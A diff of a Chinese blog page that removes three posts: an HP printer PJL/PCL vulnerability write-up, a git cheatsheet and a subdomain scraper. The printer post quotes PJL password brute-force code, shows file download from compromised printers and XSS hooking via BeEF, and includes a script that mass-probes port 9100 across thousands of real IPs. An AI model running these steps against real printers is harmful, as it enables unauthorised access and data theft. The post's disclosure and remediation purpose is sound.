@@ -47,7 +47,7 @@
 				<h1 class="site-name"><a href="/" title="Anka9080&#39;s Notes">Anka9080&#39;s Notes</a></h1>
 				<h2 class="blog-motto">Call Me Fucking Full Stacker</h2>
 			</div>
-			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
 			</a></div>
 			<nav class="animated">
 				<ul>
@@ -63,7 +63,7 @@
  					
 					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
 						<label>Search</label>
-						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
 						<input type="hidden" name="q" value="site:www.evilclay.com">
 					</form>
 					
@@ -75,1073 +75,244 @@
     <div id="container">
       <div id="main">
 
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2016/03/02/printer-hack/" title="HP 打印机 PCL 漏洞分析与利用" itemprop="url">HP 打印机 PCL 漏洞分析与利用</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2016-03-02T09:46:18.000Z" itemprop="datePublished"> Published 2016-03-02</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h2 id="0x01-漏洞概要"><a href="#0x01-漏洞概要" class="headerlink" title="0x01 漏洞概要"></a>0x01 漏洞概要</h2><p>PCL代表打印机控制语言（Printer Control Language），由惠普公司开发，并被广泛使用的一种打印机协议。关于另一种页面描述语言，应该提一提由Adobe设计的PostScript（PS），它可以将更为复杂的事情交由绘图仪/打印机处理。PJL (Printer Job Language，打印机作业语言)作为PCL的扩展，用于指导打印机行为，比如更改设备设置、传输文件等。 若打印机的9100端口向公网开启，在向打印机发送PJL指令之前需要对使用者的身份进行认证，认证程序的密钥长度为２字节(Byte)，因此可以通过暴力破解认证密钥想打印机发送PJL指令，最终导致任意命令的执行。</p>
-<p><strong>PJL</strong> (Printer Job Language)程序用于告诉打印机执行什么动作，是对PCL的额外支持。 PJL (Printer Job Language) 用于规范格式化页面的基本语言。本身是无害的，但却成为大多数解析器和解释器的漏洞利用代码。</p>
-<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>打印机系统9100端口开启时，若连上该端口通过PJL指令发送设备名称请求并得到打印机的响应，说明可以未授权访问打印机，PJL保护机制的密钥由２个字节(16比特)的存储单位存储，可以进行暴力破解攻击，从而得到目标打印机的完全访问权限。</p>
-<p>根据国外安全研究员PHENOELIT 已经写好了漏洞利用程序，对其中的主要代码进行分析，得到下面的流程图</p>
-<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/flowchart.jpg" alt=""></p>
-<p>下面是破解密钥部分的代码：</p>
-<ul>
-<li><p>在pjlsession.cpp中的230到256行</p>
-<p>  String    ts;<br>  char numb[50];<br>  if ((pass==0)||(pass&gt;65535)) throw ExInvalid();#ifndef UNIX<br>  _snprintf(numb,49,”%u”,pass);#else<br>  snprintf(numb,49,”%u”,pass);#endif //UNIX<br>  connection.clear();<br>  connection.sendbuf.set(PJL_START);<br>  connection.sendbuf.append(“\r\n”);<br>  connection.sendbuf.append(“@PJL JOB PASSWORD=”);<br>  connection.sendbuf.append(numb);<br>  connection.sendbuf.append(“\r\n@PJL DEFAULT PASSWORD=0 \r\n”);<br>  connection.sendbuf.append(“@PJL EOJ\r\n”);<br>  connection.sendbuf.append(PJL_FINISH);<br>  connection.senddata();<br>  // TEST !!!<br>  // connection.recvatleast(9,ctimeout);<br>  // end TEST<br>  connection.sendbuf.clear();</p>
-</li>
-</ul>
-<p>因为打印机所使用的密码长度只有2个字节，即16个bit, 65535中表示方法，所以密码范围在0到65535之间，这就是为什么程序能暴力破解打印机认证密码。<br>connection.sendbuf.set()后面根据PJL协议发送指定的数据包。使攻击者在破解密码之后可以用里面的命令进行任意操作了。</p>
-<h2 id="0x03-案例分析"><a href="#0x03-案例分析" class="headerlink" title="0x03 案例分析"></a>0x03 案例分析</h2><p>首先获取可能存在漏洞的打印机IP地址，打开www.zoomeye.org，输入漏洞关键字 HP LaserJet 进行搜索。搜索结果如下：</p>
-<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/HP-LaserJet.jpg" alt=""></p>
-<p>从结果中可以看到一些带有 HP LaserJet 标签的互联网主机和所属国家信息，这些主机就很有可能隐藏着打印机漏洞。我们从中选取一些进行测试。</p>
-<p><strong>Nmap端口扫描</strong></p>
-<p>Nmap的扫描结果显示主机不但开启了9100端口，80，443，23端口也开着，入侵也就多了一些其他的方式。</p>
-<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/Nmap.jpg" alt=""></p>
-<p>我们使用 PHENOELIT 开发的PFT工具来进行渗透测试。这个用C++写成的黑客工具有简单的命令行交互界面，专门用来破解PLJ接口的打印机，获取打印机的环境变量、文件系统和重要目标文件。</p>
-<p><strong>PFT密码破解</strong></p>
-<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/pft.jpg" alt=""></p>
-<p>我们运行PFT工具，用 help 命令查看帮助文档</p>
-<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/help.jpg" alt=""></p>
-<p>可以用PFT提供的暴力破解功能清除掉打印机的 PJL 程序保护。</p>
-<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/bruteforce.jpg" alt=""></p>
-<p>显示密码清除成功，使用 ls 命令查看打印机上硬盘里的文件：</p>
-<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/remote.jpg" alt=""></p>
-<p>在这里可以查看打印机硬盘中存放的所有东西。如果打印机缓存了打印文件，在这里也是可以找到的。我们可以进入一个目录选择一个文件下载到本地：</p>
-<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/download.jpg" alt=""></p>
-<p>查看L006105.XML文件的内容：</p>
-<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/xml.jpg" alt=""></p>
-<p>在这里可以查看到一些诸如本次打印的任务主机IP，邮箱，打印的文件名等敏感信息。</p>
-<p><strong>XSS攻击</strong></p>
-<p>存在于惠普打印机中风险的仅仅是拒绝服务,信息泄漏这么简单吗?在 Exploit-DB网站 中找到 HPLaserJet printers - Multiple Stored XSS Vulnerabilities(点击连接) 惠普打印机的多个存储型 XSS 漏洞, 对应 CVE 号: CVE-2012-3272 没给出利用方式，试着打开浏览器Fuzz了出来： 点击WEB的“支持信息”连接</p>
-<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/support.jpg" alt=""></p>
-<p>点击 Apply 按钮，出现了 XSS 弹框：</p>
-<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/xss.jpg" alt=""></p>
-<p>利用该漏洞，配合 Beef 攻击框架，通过一段编写好的 JavaScript（hook.js）控制目标主机的浏览器，通过目标主机浏览器获得该主机的详细信息，并进一步扫描内网，配合 Metasploit 绝对是内网渗透一大杀器。</p>
-<h2 id="0x04-全球漏洞分布"><a href="#0x04-全球漏洞分布" class="headerlink" title="0x04 全球漏洞分布"></a>0x04 全球漏洞分布</h2><p><strong> 自动测试脚本 </strong></p>
-<p>HP打印机的厂商已经对固件进行了升级，采用更安全的加密机制处理PJL密钥，不过由于全球范围用户基数比较大，已经用户安全意识不强，依然大量存在这种受害打印机，由ZoomEye网络空间搜索引擎导出的数据接合我们小组写的自动化扫描脚本。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">PJL_START = <span class="string">"\033%-12345X@PJL "</span></span><br><span class="line">PJL_FINISH = <span class="string">"\033%-12345X\r\n"</span></span><br><span class="line">PJL_USTATUS = <span class="string">"USTATUS DEVICE="</span></span><br><span class="line">PJL_INFO_ID = <span class="string">"INFO ID\r\n"</span></span><br><span class="line"></span><br><span class="line">EOF = PJL_START + PJL_USTATUS + <span class="string">"OFF\r\n"</span> + PJL_FINISH  <span class="comment">#PJL  语言</span></span><br><span class="line">DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH  <span class="comment">#PJL  语言  获取设备型号</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Printer</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.usage()</span><br><span class="line">        <span class="keyword">if</span> sys.argv &lt; <span class="number">1</span> :</span><br><span class="line">            self.usage()</span><br><span class="line">        self.readfile(options.file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">(self)</span>:</span></span><br><span class="line">        parser = OptionParser()</span><br><span class="line">        parser.add_option(<span class="string">"-i"</span>, <span class="string">"--ip"</span>, dest=<span class="string">"ip"</span>,</span><br><span class="line">                          help=<span class="string">"test single ip"</span>)  <span class="comment">#</span></span><br><span class="line">        parser.add_option(<span class="string">"-f"</span>, <span class="string">"--file"</span>,dest=<span class="string">"file"</span>,</span><br><span class="line">                          help=<span class="string">"files "</span>) <span class="comment">#</span></span><br><span class="line">        <span class="keyword">global</span> options</span><br><span class="line">        (options, args) = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Buildsocket</span><span class="params">(self, ip, port=<span class="number">9100</span>)</span>:</span></span><br><span class="line">        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,<span class="number">0</span>)   <span class="comment">#与主机建立socket连接</span></span><br><span class="line">        sock.settimeout(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sock.connect((ip, port))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[!*]-ip-%s-can't connect--"</span> % ip</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        sock.send(EOF)</span><br><span class="line">        sock.send(DEVICEID)   <span class="comment"># 发送PJL指令给远程打印机</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            device = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'No'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[!*]-ip-%s-is-ok\r\ndeviceidis-%s"</span> % (str(ip), device)</span><br><span class="line">        sock.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'OK'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetDiviceMap</span><span class="params">(self, data,status)</span>:</span></span><br><span class="line">        f = open(<span class="string">'result.txt'</span>, <span class="string">'a+'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f.write(str(data[<span class="string">'ip'</span>]) + <span class="string">', '</span> + status + <span class="string">', '</span> + str(data[<span class="string">'geoinfo'</span>][<span class="string">'country'</span>][<span class="string">'name'</span>][<span class="string">'en'</span>])</span><br><span class="line">            +<span class="string">', '</span>+ str(data[<span class="string">'geoinfo'</span>][<span class="string">'city'</span>][<span class="string">'en'</span>]) + <span class="string">', '</span> + str(data[<span class="string">'geoinfo'</span>][<span class="string">'location'</span>][<span class="string">'longitude'</span>])</span><br><span class="line">            +<span class="string">', '</span>+ str(data[<span class="string">'geoinfo'</span>][<span class="string">'location'</span>][<span class="string">'latitude'</span>]) + <span class="string">', '</span> + str(data[<span class="string">'geoinfo'</span>][<span class="string">'country'</span>][<span class="string">'code'</span>])</span><br><span class="line">            +<span class="string">', '</span> + str(data[<span class="string">'geoinfo'</span>][<span class="string">'continent'</span>][<span class="string">'name'</span>][<span class="string">'en'</span>]) + <span class="string">"\r\n"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">readfile</span><span class="params">(self, file)</span>:</span></span><br><span class="line">        Vuln_ip = <span class="number">0</span> <span class="comment"># ip 列表输入的IP数量</span></span><br><span class="line">        No_vuln_ip = <span class="number">0</span></span><br><span class="line">        CantConnectIP = <span class="number">0</span></span><br><span class="line">        linenum = <span class="number">0</span></span><br><span class="line">        f = open(file, <span class="string">'r'</span>)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            data = json.loads(line)</span><br><span class="line">            status = self.Buildsocket(data[<span class="string">'ip'</span>])</span><br><span class="line">            <span class="keyword">if</span> status == <span class="string">'error'</span>:</span><br><span class="line">                CantConnectIP += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> status == <span class="string">'No'</span>:</span><br><span class="line">                No_vuln_ip += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                Vuln_ip += <span class="number">1</span></span><br><span class="line">            self.GetDiviceMap(data, status)</span><br><span class="line">            linenum += <span class="number">1</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[!*]-Now-is-%s-lines"</span> % str(linenum)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">print</span> str(CantConnectIP) + <span class="string">"  "</span> + str(No_vuln_ip) + <span class="string">"  "</span> + str(Vuln_ip)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    Printer()</span><br></pre></td></tr></table></figure>
-<p>全球影响面</p>
-<p>这个漏洞波及了很多国家和地区，以美国最盛。我们用小组开发的自动化脚本加上ZoomEye提供的1万组惠普打印机IP进行测试。 结果绘制成图表如下。</p>
-<ul>
-<li>全球可入侵IP分布</li>
-</ul>
-<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/hacked2.jpg" alt=""></p>
-<ul>
-<li>全球已修复IP分布</li>
-</ul>
-<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/non-hacked.jpg" alt=""></p>
-<p>可以看到，美国是 PCL 打印机漏洞的重灾区，至今还拥有数量最多的漏洞主机。韩国也受到了很大的影响。其他国家，包括中国，有漏洞的打印机数量都不多，而且一半以上已被修复。</p>
-<p><img src="http://zhufengdaaa.github.io/assets/images/2015-07-20/exploit-ratio.jpg" alt=""></p>
-<h2 id="0x05-修补建议"><a href="#0x05-修补建议" class="headerlink" title="0x05 修补建议"></a>0x05 修补建议</h2><p>对打印机管理员有以下建议：</p>
-<ul>
-<li>不使用的服务，如 FTP ，TELNET 服务，应手动关闭。</li>
-<li>直接关闭 9100 端口，不允许外网访问。</li>
-<li>不要使用公网 IP 作为打印机地址。</li>
-<li>关注产品动态，保证及时更新。</li>
-</ul>
-<p>本文由 我和另外两个小伙伴 fengxuan zhufengdaaa 完成。</p>
-<p>参考网址：</p>
-<p><a href="https://www.altamiracorp.com/blog/employee-posts/hacking-hp-printers-for-fun-profit" target="_blank" rel="external">https://www.altamiracorp.com/blog/employee-posts/hacking-hp-printers-for-fun-profit</a></p>
-<p><a href="https://en.wikipedia.org/wiki/Printer_Job_Language" target="_blank" rel="external">https://en.wikipedia.org/wiki/Printer_Job_Language</a></p>
-<p><a href="http://www.51cto.com/art/200508/7989.htm" target="_blank" rel="external">http://www.51cto.com/art/200508/7989.htm</a></p>
-<p><a href="https://www.exploit-db.com/exploits/10011/" target="_blank" rel="external">https://www.exploit-db.com/exploits/10011/</a></p>
-<p><a href="http://www.freebuf.com/articles/system/7115.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/7115.html</a></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-
-  <div class="article-tags">
   
-  <span></span> <a href="/tags/漏洞分析/">漏洞分析</a><a href="/tags/打印机漏洞/">打印机漏洞</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2016/03/02/printer-hack/#comments" class="ds-thread-count comments-count-link" data-thread-key="2016/03/02/printer-hack/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2015/07/10/github-cmd/" title="GitHub 常用命令备忘录" itemprop="url">GitHub 常用命令备忘录</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2015-07-10T09:42:04.000Z" itemprop="datePublished"> Published 2015-07-10</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p>git init 把当前目录变成Git可以管理的仓库<br>随后出现.git目录，这个目录是Git来跟踪管理版本库的<br>git commit -m “change message” 提交代码到Git<br>git add file1.txt<br>git add file2.txt 先添加多个文件 之后一起提交</p>
-<p>git status 命令可以让我们时刻掌握仓库当前的状态<br>比如：文件是否被修改，修改后是否提交<br>git diff readme.txt 查看这个文件上次修改具体改了那些内容</p>
-<p>git中的一次commit 是仓库的一个快照，一旦文件出现了差错，可以从最近的一个<br>commit恢复<br>git log 显示最近到最远的提交日志，用于回溯版本</p>
-<p>get reset –hard [HEAD^|commit id]</p>
-<p>git reflog 现实对版本库的各种操作记录，用于重返未来</p>
-<p>工作区：电脑里能看到的目录<br>版本库：.git（隐藏目录），Git的版本库<br>Git的版本库里有很多东西，其中最重要的就是stage（暂存区）+master<br>把文件往Git版本库里提交的时候，分两步执行：<br>git add 把 文件添加到暂存区<br>git commit 把暂存区的所有文件提交到当前分支</p>
-<p>一旦提交后，如果没有对工作区做任何修改，那么工作区的status就是“干净”的</p>
-<p>第一次修改-&gt;git add -&gt; 第二次修改 -&gt; git commit<br>git commit负责的是把暂存去的文件提交了，第二次修改的内容u会被提交。<br>正确步骤：第一次修改-&gt;git add -&gt; 第二次修改 -&gt; git add -&gt; git commit<br>git diff HEAD –readme.txt 查看工作区和版本库里面最新版本的区别</p>
-<p>git checkout –readme.txt 用版本库里的版本替换工作区的版本<br>有两种情况：<br>readme.txt 自修改后还没有放到缓存区，执行后会回到和版本库一模一样的状态。<br>readme.txt 已经添加到暂存区后，又做了修改，<br>总之，是让这个文件回到最近一次git commit 或 git add的状态</p>
-<p>git reset HEAD file 把暂存区的修改回退到工作区（unstage）</p>
-<p>git rm test.txt 删除版本库的test.txt文件</p>
-<p>git push -u origin master 将本地库所有的内容推送到远程库上</p>
-<p>git checkout -b dev 创建dev分支并切换<br>相当于下面两条命令：<br>git branch dev + git checkout dev<br>git branch 列出所有分支，当前分支会标*号<br>git checkout master 切换到master分支</p>
-<p>git merge dev 把dev分支的工作成功合并到master分支上<br>git branch -d dev 删除dev分支</p>
-<p>带参数的git log 看到分支的合并情况<br>git log –graph –pretty=oneline –abbrev-commit</p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-
-  <div class="article-tags">
+<section class="post" itemscope itemprop="blogitem">
   
-  <span></span> <a href="/tags/GitHub/">GitHub</a>
-  </div>
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/2015/07/10/github-cmd/#comments" class="ds-thread-count comments-count-link" data-thread-key="2015/07/10/github-cmd/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2015/06/10/python-spider-subdomain-ip/" title="Python 爬虫获取指定主机子域名及IP信息" itemprop="url">Python 爬虫获取指定主机子域名及IP信息</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="Anka9080" target="_blank" itemprop="author">Anka9080</a>
-		
-  <p class="article-time">
-    <time datetime="2015-06-10T09:09:11.000Z" itemprop="datePublished"> Published 2015-06-10</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <p><img src="http://images0.cnblogs.com/blog2015/671902/201506/100041310046606.png" alt=""></p>
-<h2 id="0x-00-前言"><a href="#0x-00-前言" class="headerlink" title="0x 00 前言"></a>0x 00 前言</h2><p>前天自己在玩的时候，自己通过百度搜索主机的二级域名感觉好麻烦，自已要一页页的去翻</p>
-<p>而且人工识别是否是重复的二级域名也够蛋疼的，正好最近在学正则表达式，权当练手了</p>
-<p>2016年更新：<br>发现了一些不错的扫子域名的网站，如下</p>
-<p><strong><a href="http://subdomain.chaxun.la" target="_blank" rel="external">http://subdomain.chaxun.la</a></strong></p>
-<h2 id="0x-01-Code"><a href="#0x-01-Code" class="headerlink" title="0x 01 Code"></a>0x 01 Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># author:Anka9080</span></span><br><span class="line"><span class="comment"># environment:Eclipse</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> cookielib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#site = 'baidu.com'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Please input the root site like "baidu.com":'</span></span><br><span class="line">site = raw_input()</span><br><span class="line">siteFormat1 = site</span><br><span class="line">siteFormat1 = siteFormat1.replace(<span class="string">'.'</span>, <span class="string">'\.'</span>)</span><br><span class="line"><span class="comment">#print siteFormat1</span></span><br><span class="line"></span><br><span class="line">urlPage = <span class="string">'http://www.haosou.com/s?src=360sou_newhome&amp;q=site:'</span>+site</span><br><span class="line">req = urllib2.Request(urlPage)</span><br><span class="line">res = urllib2.urlopen(req)</span><br><span class="line">html = res.read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment"># 获得搜索结果的页面数</span></span><br><span class="line">pageStr = re.search(<span class="string">ur'找到相关结果约(.*?)个'</span>,html)</span><br><span class="line">page = pageStr.group(<span class="number">1</span>)</span><br><span class="line">formatNum = <span class="string">'0123456789'</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> page:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> c <span class="keyword">in</span> formatNum:</span><br><span class="line">        page = page.replace(c,<span class="string">''</span>)</span><br><span class="line">page = int(page) / <span class="number">10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Total Page: '</span> + str(page)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> page &gt; <span class="number">6</span>:</span><br><span class="line">    page = <span class="number">6</span></span><br><span class="line">newItems = []</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">1</span>, page):</span><br><span class="line">    urlDomain = <span class="string">'http://www.haosou.com/s?src=360sou_newhome&amp;q=site:'</span>+site+<span class="string">'&amp;pn='</span>+str(p)</span><br><span class="line">    req = urllib2.Request(urlDomain)</span><br><span class="line">    res = urllib2.urlopen(req)</span><br><span class="line">    html = res.read().decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    tmp = <span class="string">'linkinfo\"\&gt;\&lt;cite\&gt;(.+?\.'</span>+siteFormat1+<span class="string">')'</span>;</span><br><span class="line">    pattern = re.compile(tmp)        </span><br><span class="line">    items = re.findall(pattern, html)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 去重操作</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        <span class="keyword">if</span> item <span class="keyword">not</span> <span class="keyword">in</span> newItems:  </span><br><span class="line">            newItems.append(item)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'SubDomain Count: '</span>+ str(len(newItems) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> newItems: </span><br><span class="line">   </span><br><span class="line">    <span class="comment"># 获得对应 IP 信息</span></span><br><span class="line">    pattern = re.compile(<span class="string">ur'\&gt;\&gt;\ (.*?)\&lt;\/font[\s|\S]*?本站主数据：(.*?)\&lt;\/li\&gt;'</span>)</span><br><span class="line">    urlIP = <span class="string">'http://www.ip138.com/ips138.asp?ip='</span>+item</span><br><span class="line">    req = urllib2.Request(urlIP)</span><br><span class="line">    res = urllib2.urlopen(req)</span><br><span class="line">    html = res.read().decode(<span class="string">'gb2312'</span>)    </span><br><span class="line">    result = re.search(pattern,html)</span><br><span class="line">    <span class="keyword">print</span> item + <span class="string">'    '</span> + result.group(<span class="number">1</span>) + <span class="string">'    '</span> + result.group(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
-<p>脚本运行结果如下：</p>
-<pre><code>Please input the root site like &quot;baidu.com&quot;:
-baidu.com
-Total Page: 2
-SubDomain Count: 9
-www.baidu.com    61.135.169.121    北京市 百度蜘蛛 联通
-tieba.baidu.com    123.125.65.93    北京市  联通
-fanyi.baidu.com    202.108.23.153    北京市  联通
-wenku.baidu.com    123.125.70.102    北京市 百度蜘蛛 联通
-map.baidu.com    112.80.248.48    江苏省南京市  联通
-music.baidu.com    123.125.114.14    北京市  联通
-zhidao.baidu.com    123.125.65.91    北京市  联通
-baike.baidu.com    123.125.70.105    北京市 百度蜘蛛 联通
-yun.baidu.com    123.125.65.51    北京市  联通
-pan.baidu.com    202.108.23.29    北京市  联通
-</code></pre><h2 id="0x-02-总结"><a href="#0x-02-总结" class="headerlink" title="0x 02 总结"></a>0x 02 总结</h2><p>　　　　思路大概是这个样子：</p>
-<p>　　　　先通过<strong>urllib2.Request()</strong> 和<strong> urllib2.urlopen()</strong>访问url</p>
-<p>　　　　再从返回结果中得到搜索结果页面数 </p>
-<p>　　　　为了提高效率 页面数 大于 5 会只爬行搜索结果的前5个页面</p>
-<p>　　　　后面 又做了去重操作 然后就得到二级域名列表咯 : )</p>
